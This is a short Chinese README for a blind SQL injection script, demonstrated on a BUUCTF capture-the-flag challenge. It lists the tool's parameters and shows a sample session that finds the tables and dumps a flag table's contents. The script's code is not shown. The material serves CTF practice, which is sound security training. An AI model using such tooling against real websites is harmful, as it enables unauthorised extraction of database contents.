# SQL盲注脚本

## 0x01 整数型注入脚本

以BUUCTF [[WUSTCTF2020]颜值成绩查询](https://buuoj.cn/challenges#[WUSTCTF2020]%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2)这道题为例，演示脚本如何使用。

### 参数

- url:要进行盲注的url
- require method:请求方式
- right string:返回为true时的特征文本
- right id:结果为true时提交的参数
- error id:结果为false时提交的参数
- function:使用哪种函数

### 使用

```python
>input url(e.g,'get:www.example.com?id=,post:www.example.com'):http://cfe08f29-9167-488c-b6db-3354144ab882.node4.buuoj.cn:81/?stunum=
>input require method(Get/Post):get
>input right string:Hi admin
>input right id(the number while be used when the result is right):1
>input error id:2
>select function(if/elt):if
<result:{'flag': ['flag', 'value'], 'score': ['id', 'name', 'score']}
>input table which you want to dump:flag
>columns:['flag', 'value']
>input columns(split by ','):flag,value
<result:['flagflag{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}']
```



